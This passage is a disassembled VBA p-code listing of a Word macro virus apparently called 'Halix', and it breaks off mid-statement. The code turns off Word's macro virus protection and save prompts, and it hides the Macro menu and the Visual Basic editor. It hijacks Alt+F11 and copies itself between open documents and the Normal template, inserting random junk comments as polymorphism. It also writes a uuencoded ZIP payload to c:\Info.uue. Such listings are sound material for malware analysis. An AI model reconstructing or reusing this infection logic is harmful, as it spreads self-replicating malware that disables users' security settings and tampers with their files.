' 	MemStWith VirusProtection 
' Line #31:
' 	QuoteRem 0x0000 0x0043 "~"&iuwy$i;ww A[D$&- qx-XUe42PmHLDG+%d;)OS^p,B6*GFjrG}V0Y7Idq2l5ai+"
' Line #32:
' 	LitDI2 0x0000 
' 	MemStWith ConfirmConversions 
' Line #33:
' 	QuoteRem 0x0000 0x0036 "Q }P_$etwR|Gb.>q2QvA1>DP3!2R{]*csp~')5cJ\VQ[cgE&A 7id"
' Line #34:
' 	QuoteRem 0x0000 0x0031 "?|R&`H{_Zc&_i*cbi)>-fPOmLC{T3UH24m%IA.!lj`G#~FF"
' Line #35:
' 	QuoteRem 0x0000 0x000E "XY,=(f%l*QLU,k"
' Line #36:
' 	QuoteRem 0x0000 0x0076 "-w>B&F7[Oq ?ZC#D4@Q&&8St7,xzc2jNh >!5,UpT3Ok_1t}FC?lU4'z3>tI9d5)C?o/vr8.>]}#m#M\wk1+B+A@kt:9+l qAL*E=Z~^{$z-Z~h/AQ"
' Line #37:
' 	LitDI2 0x0000 
' 	MemStWith SaveNormalPrompt 
' Line #38:
' 	EndWith 
' Line #39:
' 	StartWithExpr 
' 	LitStr 0x0005 "tools"
' 	ArgsLd CommandBars 0x0001 
' 	With 
' Line #40:
' 	LitDI2 0x0000 
' 	LitStr 0x0005 "Macro"
' 	ArgsMemLdWith Controls 0x0001 
' 	MemSt Enabled 
' Line #41:
' 	LitDI2 0x0000 
' 	LitDI2 0x000F 
' 	ArgsMemLdWith Controls 0x0001 
' 	MemSt Enabled 
' Line #42:
' 	QuoteRem 0x0000 0x004E "@SXOn)/.v"1|1:@'7 _lB0x&_2AOG$\H_PA|[oTSU5YT#Ir2#sK|F,zzAk`w2:BSK@xyBYOGSNrO"
' Line #43:
' 	QuoteRem 0x0000 0x0039 "{3/~bTc~):nyZ|IC[/A8A%_Ww+P5].1_YIwf~fw=g.dv58~Wz(uw$]i{"
' Line #44:
' 	EndWith 
' Line #45:
' 	LitDI2 0x0000 
' 	LitStr 0x000C "Visual Basic"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Visible 
' Line #46:
' 	QuoteRem 0x0000 0x0058 "U&..t7H5;E0dtjw0iVDFC(8y4Ii7'VBe(VXY">qOY'M1%=)W8s6gD%f:uPfPf[b{b+:/D6]6vg4KaAd8c8BMn{"
' Line #47:
' 	StartWithExpr 
' 	Ld Application 
' 	With 
' Line #48:
' 	LitStr 0x0005 "Halix"
' 	MemStWith UserName 
' Line #49:
' 	LitStr 0x0003 "HAL"
' 	MemStWith UserInitials 
' Line #50:
' 	LitStr 0x0016 "Abajo Fidel Castro Ruz"
' 	MemStWith UserAddress 
' Line #51:
' 	EndWith 
' Line #52:
' 	QuoteRem 0x0000 0x0088 "J'D$h6waP@oV1K1Y~`&Y3O6G1\{3/n4)]/){rOEIV+PF$iXIDg{`{Mbu4-Wrf^1rEp?Xx]/{4PQ>'1w*)4lgV#xo/wY4z@6Np\1Gy#0"[V#?:0b._^YbW`T*f*`ZybbSGdMtR3"
' Line #53:
' 	QuoteRem 0x0000 0x0090 "Z35F+F_=%uVfV;xDq$)V9'<EpQu6fn:H9)y4!gT|3/a[<yKD%Vc<_XKuaKCn!5nDv._7AsRr,|7%hbR m&z;X'+@s23%-Te8|_'D0GnKIQ+x/3\z`0S ?nf/^iuV"&oA)m!rj-AiVGp"
' Line #54:
' 	QuoteRem 0x0000 0x000B "GoTo NoBind"
' Line #55:
' 	SetStmt 
' 	Ld wdKeyAlt 
' 	Ld wdKeyF11 
' 	ArgsLd BuildKeyCode 0x0002 
' 	ArgsLd FindKey 0x0001 
' 	Set miTecla 
' Line #56:
' 	Ld wdKeyCategoryMacro 
' 	ParamNamed KeyCategory 
' 	LitStr 0x0006 "BlowUp"
' 	ParamNamed Command 
' 	Ld miTecla 
' 	ArgsMemCall Rebind 0x0002 
' Line #57:
' 	Label NoBind 
' Line #58:
' 	QuoteRem 0x0000 0x008C "[yCY0q!_4:Dxc@qhhi*]:t{os69v0u*s|Z#"rz7&$X9!<&D<z>V"69zWtp&v{_]>[-  GK6,tm59A}5"%$N{NP6\sBw+(mTZftS4HUV5C|lJ8x@p9a~EG~&@.;lK1>XgTjq@xGt"
' Line #59:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd vbcomponents 
' 	ArgsMemLd Item 0x0001 
' 	Set ad 
' Line #60:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd vbcomponents 
' 	ArgsMemLd Item 0x0001 
' 	Set nt 
' Line #61:
' 	Ld MacroContainer 
' 	MemLd FullName 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Eq 
' 	IfBlock 
' Line #62:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemLd lines 0x0002 
' 	LitStr 0x0006 "'Halix"
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	GoTo WorkNormal 
' 	EndIf 
' Line #63:
' 	ElseBlock 
' Line #64:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemLd lines 0x0002 
' 	LitStr 0x0006 "'Halix"
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	GoTo Document 
' 	EndIf 
' Line #65:
' 	EndIfBlock 
' Line #66:
' 	GoTo Activar 
' Line #67:
' 	Label Document 
' Line #68:
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemLd lines 0x0002 
' 	St InfStr 
' Line #69:
' 	Ld InfStr 
' 	LitDI2 0x0002 
' 	Ld InfStr 
' 	FnLen 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Val 0x0001 
' 	LitDI2 0x0001 
' 	Add 
' 	St Inf 
' Line #70:
' 	Ld ad 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St lin 
' Line #71:
' 	QuoteRem 0x0000 0x0083 ".,^v5` 4A?/W%&XZ>WTY fb]f=~uk{q2M@PuXcbv.GL$R&G^V[!@4n<,4|bi0n38lonmFW%gdN"~qjDSW\p@vdhCem%yxoA6\}?<d3GwT}\##'jFu!i7)>?Pj9r#&wU:R3r"
' Line #72:
' 	LitDI2 0x0001 
' 	Ld lin 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #73:
' 	LitDI2 0x0001 
' 	LitStr 0x0006 "'Halix"
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemCall insertlines 0x0002 
' Line #74:
' 	LitDI2 0x0002 
' 	LitStr 0x0001 "'"
' 	Ld Inf 
' 	ArgsLd Str 0x0001 
' 	Add 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemCall insertlines 0x0002 
' Line #75:
' 	LitDI2 0x0003 
' 	St lin 
' Line #76:
' 	LitDI2 0x0003 
' 	St slin 
' Line #77:
' 	Ld slin 
' 	Ld nt 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Le 
' 	DoWhile 
' Line #78:
' 	QuoteRem 0x0000 0x0017 "wsG 3XfqS;cvfsi]|)T y/`"
' Line #79:
' 	QuoteRem 0x0000 0x003A "0p2h(.1/zdNV'I/;z)][sh`u:1[T#r|f,w%tQQ4g:NqS"!(LTuR?^_2XAB"
' Line #80:
' 	QuoteRem 0x0000 0x0047 "98VL3y@")\6T/r[P4-^}E1':-6~[5<([QqN^$U[].<Pt@uHKufi/qr`so}AzJpt<lciI7"
' Line #81:
' 	QuoteRem 0x0000 0x006E "IPc%T(I\o\z@MLLLp^p(o8L o6zda"_Kx3hQ!<NX2m)T/[lAAQ:7%u@)Z.#hc!9lYPV~,xPoj_MT}5V0cLly@'WvdJHvETq\C>^&k,<)$U`"
' Line #82:
' 	LitDI2 0x0004 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0003 
' 	Eq 
' 	St decn 
' Line #83:
' 	Ld decn 
' 	IfBlock 
' Line #84:
' 	LitStr 0x0001 "'"
' 	St codigo 
' Line #85:
' 	QuoteRem 0x0000 0x0059 "Bj$]j(]Mb>9vk8)ccg0(w1r<k<RNw/Tt^JK/ zI+e>RP2y;f<Tn0((d-JKZme+?d!F;d_q+{~W6E7`[R1"4uy[:"
' Line #86:
' 	LitDI2 0x0093 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0002 
' 	Add 
' 	FnInt 
' 	St a 
' Line #87:
' 	QuoteRem 0x0000 0x0051 "Q%^3e!=kR:mhRp_o[s{+R{MQdY7<@"/$e2 noXJ)p4;[GI$=_{z[(o$<8|"OSiz%.+G0K\$*B}"C6c#|"
' Line #88:
' 	QuoteRem 0x0000 0x0019 "E"P_G]v~(uU$~3v<zzqC3u7"
' Line #89:
' 	QuoteRem 0x0000 0x007E "tW7@MjycCEFU4jb\K{le6g9~^2#I/4PiAIm9mAM4Bi58VB#:B\NC#!>)I=:#G52RTE<^$GnX$=k#{*)#2n{4I7r[NVg]U0_r6EP,7*@pndx7@#J@9oXa73gZPUVhN"
' Line #90:
' 	StartForVariable 
' 	Ld J 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld a 
' 	For 
' Line #91:
' 	Ld codigo 
' 	LitDI2 0x0061 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x001F 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St codigo 
' Line #92:
' 	StartForVariable 
' 	Ld J 
' 	EndForVariable 
' 	NextVar 
' Line #93:
' 	QuoteRem 0x0000 0x006D "s{*R *$azE< !5kk4>hA>l/xT^<]2Md}iG>3+>m@,::.<7,Mu%5q*Y4<d7:I^Ywj5G,=5psBRmV\nn*U^m{q^IMB'Jb-ZK)k;spo& D-vJZ)"
' Line #94:
' 	LitVarSpecial (True)
' 	St Iready 
' Line #95:
' 	ElseBlock 
' Line #96:
' 	Ld slin 
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemLd lines 0x0002 
' 	St codigo 
' Line #97:
' 	LitVarSpecial (True)
' 	St Iready 
' Line #98:
' 	Ld codigo 
' 	LitStr 0x000C "Sub BlowUp()"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0015 "Private Sub BlowUpH()"
' 	St codigo 
' 	EndIf 
' Line #99:
' 	Ld codigo 
' 	LitStr 0x000C "'GoTo NoBind"
' 	Eq 
' 	IfBlock 
' Line #100:
' 	QuoteRem 0x0000 0x006B "-qyYM)a~bcFMI %"J16a2$PSx8}&i`,[9z.$`)?j"eb@_%3B&`(oVbf)GG!'1/ocI?mXYdC!''1f#dTD&s\pu,w{~p$ PDCJ9'O^/-B.^"
' Line #101:
' 	QuoteRem 0x0000 0x0039 " ]WxGXR]hk7,p$&zl=0=wQ1\*``RW&>9SoCIDZAfzb!7+3Tfc] <E]%="
' Line #102:
' 	LitStr 0x000B "GoTo NoBind"
' 	St codigo 
' Line #103:
' 	QuoteRem 0x0000 0x0084 "M!uH=COoeY^(y+w,X!nu2uFldv~QK+*u:,y)un[/VG0\zLPI_HO)]InU&~tP(Y4(fgmP4>7}eBc#C"$3Tk5aBouTJp? {xX!ojp*?1#Incr)a[fnf-A[[u5 \PZ;dh^)fW"
' Line #104:
' 	QuoteRem 0x0000 0x002C "_6z~$4jH0h^P8JJQ)*/EO H cNXAa5`)`ioVd[ZFs"
' Line #105:
' 	QuoteRem 0x0000 0x006F "pq[l Wvjo*Y!>.1F}%)ziaHcU<o|ZzmVHt)XqEI3DmGuidlbkTs E:7EPfc#_VQtUuil.FYASCW}5mlbuZb'dH^85w>(IDryrYD3dC?DC*4]"
' Line #106:
' 	EndIfBlock 
' Line #107:
' 	Ld codigo 
' 	LitDI2 0x0001 
' 	ArgsLd LBound$ 0x0002 
' 	LitStr 0x0001 "'"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (False)
' 	St Iready 
' 	EndIf 
' Line #108:
' 	Ld slin 
' 	LitDI2 0x0001 
' 	Add 
' 	St slin 
' Line #109:
' 	QuoteRem 0x0000 0x005C "4W3Y4sZjoy! yD[Z9@*4@U?4bm!*8O}G/\<U[r$5-| q!EmB}957/HkhCrULIA8!~BY.@.m~l5OK wf1f8CIh6\B($vY"
' Line #110:
' 	EndIfBlock 
' Line #111:
' 	QuoteRem 0x0000 0x0080 "{$UhI9$"W1T+tp4SZ})3m :!W70eU<:xflHH?ouTe`T-DXD.&XCGqp+x8aDlxXxZM8-HgRFmEJ:U=IAKOT9/2(zR>H'u$#!vhy]K))cqOJ=9`ogQYCGu\&-JwZdL|H"
' Line #112:
' 	Ld Iready 
' 	If 
' 	BoSImplicit 
' 	Ld lin 
' 	Ld codigo 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemCall insertlines 0x0002 
' 	EndIf 
' Line #113:
' 	Ld lin 
' 	LitDI2 0x0001 
' 	Add 
' 	St lin 
' Line #114:
' 	Loop 
' Line #115:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #116:
' 	QuoteRem 0x0000 0x0032 "1j|7i5;Izfr``PsvH5'ISu;Iwv+UrB&{8ccH|I5{F=4>QZa)rd"
' Line #117:
' 	QuoteRem 0x0000 0x0003 "yqe"
' Line #118:
' 	GoTo Activar 
' Line #119:
' 	Label WorkNormal 
' Line #120:
' Line #121:
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemLd lines 0x0002 
' 	St InfStr 
' Line #122:
' 	Ld InfStr 
' 	LitDI2 0x0002 
' 	Ld InfStr 
' 	FnLen 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Val 0x0001 
' 	LitDI2 0x0001 
' 	Add 
' 	St Inf 
' Line #123:
' 	Ld nt 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St lin 
' Line #124:
' 	LitDI2 0x0001 
' 	Ld lin 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #125:
' 	QuoteRem 0x0000 0x0085 "e.eAdBsv@sI3a86'DG3*f<!V~|&Symd>h+_#'ofZ@Mii<VsUw"nxGmZ[kD<T5\"1-`kY+=H;Q"mdf13.eKwllQ,"U&1#8{m_8^pFm*n"*Z&9YmkQ A$5U{r>#NWJ&IrORO^"
' Line #126:
' 	LitDI2 0x0001 
' 	St lin 
' Line #127:
' 	Ld lin 
' 	Ld ad 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Le 
' 	DoWhile 
' Line #128:
' 	QuoteRem 0x0000 0x0046 "UfR-JKGT@q>nh*2L<=EaFu0"PGE<;[F]=]A mUUhm/5QE{JGBE?A~LRf+Gu@SgGHMQP/Qs"
' Line #129:
' 	Ld lin 
' 	LitDI2 0x0001 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemLd lines 0x0002 
' 	St codigo 
' Line #130:
' 	Ld codigo 
' 	LitStr 0x0015 "Private Sub BlowUpH()"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000C "Sub BlowUp()"
' 	St codigo 
' 	EndIf 
' Line #131:
' 	Ld codigo 
' 	LitStr 0x000B "GoTo NoBind"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000C "'GoTo NoBind"
' 	St codigo 
' 	EndIf 
' Line #132:
' 	QuoteRem 0x0000 0x003F "tbZy4;268Nt^w,ELu)5xCG5FbBv#&WNwq?.=`!o<{h7IS6@od{eACQZ2O?q_oN"
' Line #133:
' 	Ld lin 
' 	Ld codigo 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemCall insertlines 0x0002 
' Line #134:
' 	Ld lin 
' 	LitDI2 0x0001 
' 	Add 
' 	St lin 
' Line #135:
' 	QuoteRem 0x0000 0x0082 "24uZF[o\'RN_3ql8)Aw8<<`JY*?BDKPP3KAd\7!m<eGI8T%;SKDI~d*>x!~R!oQAUJ-/3JS%Sc@.F@/23n:Ng6.[9+@o`0j&Y`^U+QPj0T0fa/)k1s^KN9gPWMw{j\P"
' Line #136:
' 	Loop 
' Line #137:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #138:
' 	QuoteRem 0x0000 0x002E "Yqo/"c(-{ZadR>F6/no,+Y;WX(Fa,,M-~-#tcKz|DtSp"
' Line #139:
' 	QuoteRem 0x0000 0x000D "{EUSBKw<<H]I"
' Line #140:
' 	Label Activar 
' Line #141:
' 	QuoteRem 0x0000 0x005E "ad}:X`=v,*!xk0~o}/YG&NHepB>9b[IX|:5)^v j-4n<Y)E)HTX.Y2@(KzPae> G|Sqb$d40(D#HI=\n"K^_ 8?ZM/u"
' Line #142:
' 	LitStr 0x000B "c:\Info.uue"
' 	Ld vbNormal 
' 	ArgsLd Dir 0x0002 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #143:
' 	LitStr 0x000B "c:\Info.uue"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #144:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0000 ""
' 	PrintItemNL 
' Line #145:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "_=_ "
' 	PrintItemNL 
' Line #146:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0024 "_=_ Part 001 of 001 of file Info.zip"
' 	PrintItemNL 
' Line #147:
' 	QuoteRem 0x0000 0x0012 "eOiqs1S<RN,:RxnXkl"
' Line #148:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "_=_ "
' 	PrintItemNL 
' Line #149:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0000 ""
' 	PrintItemNL 
' Line #150:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0012 "begin 666 Info.zip"
' 	PrintItemNL 
' Line #151:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x003D "M4$L#!!0``@`(`(,1`BN/U0L5[@D```X6```(````26YF;RYH=&V%6&N/&[<5"
' 	PrintItemNL 
' Line #152:
' 	QuoteRem 0x0000 0x0071 "bB@/:C9c Fc'!/;Ww(h d_=n)9E*qI4!c'VD[Rrx%>G`a!uqeL$'"e"*:;`OSS*kIml OQ2B}oDg;cMVmIb{ee|;+`>9ami\j8MQ<G,I#zPd?"
' Line #153:
' 	QuoteRem 0x0000 0x0017 "2y2K5.n}n:!n)27R%8J"NLb"
' Line #154:
' 	QuoteRem 0x0000 0x0014 "p1#E~"?6W,[od9w3%z"
' Line #155:
' 	QuoteRem 0x0000 0x0028 "o.! d=<47I58[+[fHM@BF.h$ku'c01<sYVw',"
' Line #156:
' 	QuoteRem 0x0000 0x002B "9=xrwXa}Wkmj{]Vcdx93\-xVtZ0)Y^WPk1P;H=i2yC"
' Line #157:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0030 "M_5Z@_X%0`2,%Y'4;(&@0/X#U>ETOLJ]ZY:`M_(4S0TDT.*1"
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000C "SB@K__J><TG."
' 	Add 
' 	PrintItemNL 
' Line #158:
' 	QuoteRem 0x0000 0x0025 "I@YW<<5FwOt!^jl4JIxhC;]X~n}GW#KhH-Qh"
' Line #159:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "M2-NX#>"
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0035 "L-)JYO*]S[KGSZL/JYOK-'__PZL/E^3O^O;E<G:L/J]7]\\M_?+KZ"
' 	Add 
' 	PrintItemNL 
' Line #160:
' 	QuoteRem 0x0000 0x001A "_)EA~mX*rtS(f%k14XMP7f\\L\"
' Line #161:
' 	QuoteRem 0x0000 0x007E "DvZZD3&ErX`Th&ysiD7Jazum}0/>Y~wp*T-T|?'.'=;:fV/$U}Z"x6!BL3M+?0"PK06Pm=V]<EqM#cVY%_jzFm2C9|_Nadce,*Ma_]va&B"[RKc"4oJHK.Xpu!ad%"
' Line #162:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0011 "MY?7B(OC!^.'YZK`S"
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x002B "W5Q=[NZO%V]7@SF<7BQ'7KW4K5;'9,97O]F?1=^2\__"
' 	Add 
' 	PrintItemNL 
' Line #163:
' 	QuoteRem 0x0000 0x0015 "B",x~IB/[Yp$>f"{Pp I~"
' Line #164:
' 	QuoteRem 0x0000 0x0006 "Y'?O0"
' Line #165:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x003D "M^OT/WR]H:W6UNKY\\\[XT;=6*^W4)C361!]49]3%V.A7+_(]]>#;\YO+UXN5"
' 	PrintItemNL 
' Line #166:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0021 "MZ7=.#\?'7?ST^3Z&3=2]>F^=29]O;!M#"
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x001B "NM!W:W7MC6?RQ^Z=-:%01QX4:-Z"
' 	Add 
' 	PrintItemNL 
' Line #167:
' 	QuoteRem 0x0000 0x0031 "bQ\7Jq*WAk_3{fk)dBD02(xRD "xCt2F7OnA5;K\$)C"[=9!t"
' Line #168:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x003D "M>_?N7VIU^4]8^M-?Y+^%NKZZ_;E\7:\7ZI?R_4=\_Q$_O_W[Q=WUW4=<6<M_"
' 	PrintItemNL 
' Line #169:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0025 "M-`A+[^&1>KCZ]^7KOZGY!K'XYM7]_PGV7IRB"
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0017 "=Y[.YHTQ*!VHVG<=)<R26W#"
' 	Add 
' 	PrintItemNL 
' Line #170:
' 	QuoteRem 0x0000 0x001F "EkZEaSh{> LeO0$pc0OL4a"xx`(~8=H"
' Line #171:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0024 "M01FONF=6M^-@7FHUF!AMXTR/4ABU'7OKG.Z"
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0011 ".JA>NR'J`5_.5+&88"
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0006 "N:=HL/"
' 	Add 
' 	PrintItemNL 
' Line #172:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x003D "MN%-[_$WAQ)P^_K*W@;;2]/SL>3*J&:/3=`YF@AA?6YSX3.?'47+:QRW6KT/L"
' 	PrintItemNL 
' Line #173:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x003D "M=6N?A?(3CL'U7T<#][WI9[_.U*7G3X-Q9F_3_,225W?1^*01&CY'W=F@UJ/O"
' 	PrintItemNL 
' Line #174:
' 	QuoteRem 0x0000 0x0004 "[uT+"
' Line #175:
' 	QuoteRem 0x0000 0x006C "^3_E]LQ6'Mc:K.U8&q+x=exM%J$GI!TQ`~v&HeyK,4oskoRAoQ8"F0Caj>FK%yKv-\e7y%?wfSJ5%wTTOe$GxZ.,xoRp\6x~K:MU9F[mfdu"
' Line #176:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001A "M-$/7+B=@9^`E_#./K1L/!D[@K"
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0017 "%T]`3_>H.G4O5HL'M\03XW\"
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "*B,"
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "DX"
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 "6VK"
' 	Add 
' 	PrintItemNL 
' Line #177:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0008 "MFQP:76P"
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0002 "SH"
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0028 "!P`+X)XDX4Q]8TLWHD2[S%2E+0^`%E,VN$12<0OJ"
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0007 "DT:-#U,"
' 	Add 
' 	PrintItemNL 
' Line #178:
' 	QuoteRem 0x0000 0x0091 "f`Z9kys\RN.0vUY&ff9e+l\5&kD(F?H/q7,rOAwXGQtNR$~Ag6/pE/|zqo5_CH.?|S(R&;jt(6/;E&bizb;t/^o>~}ls0+@L{?C_h#'2Cg[|5y"' EP@JfllG,x`8B,SD%*_$3I]P{8@5V8"
' Line #179:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0013 "M9O-LK'DPCE[5)(Q^3G"
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0029 "C$\MH)!T=?FXC,JC/U'FKLROS17'3N-HO7CJG0\,X"
' 	Add 
' 	PrintItemNL 
' Line #180:
' 	QuoteRem 0x0000 0x0083 "W`5hS:7HV?w9pG7e>\lgP]BN2"!:grFnCP0[pfre?"k^\2IYI+ru%{Sc><?]{kfNXY;}yM5h""22u,-h3GlXW?MbQ?|!J!eWT_4"]?Y`lp]vj'SOCDa8iLsZ1~7z(q-""
' Line #181:
' 	QuoteRem 0x0000 0x001D "uJ_TfCnZ7v3h-QcHsH$M^KikB]z("
' Line #182:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "ML[$1CB"
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0035 "W@\X)TBJ-3&2RG7P_\/2-YO'9BCRBF4BTALY7]P$WJ5V(<ZUY6=+%"
' 	Add 
' 	PrintItemNL 
' Line #183:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0034 "MH_!C-#3*2D1I*TN'>IOZ<'P:[S>QMTS*[P7BZ^_P`7$[VT3XU-,"
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0008 "0G^PQZEV"
' 	Add 
' 	PrintItemNL 
' Line #184:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0032 "MK!/]8'54-W93(<2W\1O-7IMZJ8@.PRHW8VIU9*ZOX&3T9EA*`"
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000A "7*8[<]XTWT"
' 	Add 
' 	PrintItemNL 
' Line #185:
' 	QuoteRem 0x0000 0x0093 "eC8nG}exuRD,q|Ab"0`%8fP5vZi,M;h@U*9#xqq5wP6-(I7/\bv&>^)En&GTHy|Im}[H-8%BhIe!'e8NgsdagDw4#{$O</buMkq.E,f{y!sE<'FsvL|=M4Me[w:xISIUNb9G$u:sQ8+b*G"'"
' Line #186:
' 	QuoteRem 0x0000 0x005C "=ul*5+Aq$l.<Gpw\rI]*_R*d|SX"#JdHwgC-<#.~MffZi]uhjTYR|\aRI+f&{=1v2fiu9Z)4NV]^CXf*{3*T3|J}y*;"
' Line #187:
' 	QuoteRem 0x0000 0x0063 "X1I~.()$zxA&k3b_K*NJC<!9KU~MrXIc`wI+Jc|'6Z^|zgj?uyAC^8eK-p+'xjj jO|]W6U_?ldzOVn^Zm_`$+{81<|u\7PEv"
' Line #188:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0008 "M,S=5+1U"
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0018 "1YQV;YF_H-K02^WZ4<[/*=OI"
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000E "JT$$VTH/ZMVM!*"
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x000C "1B(J>E(^)Q_B"
' 	Add 
' 	PrintItemNL 
' Line #189:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0039 "M*WIUVYI4XM#T?__,U/L[Y/OFZO8*+'2@?TA([E_')`\3+($<&#/:Y^[B"
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x0003 ":H/"
' 	Add 
' 	PrintItemNL 
' Line #190:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
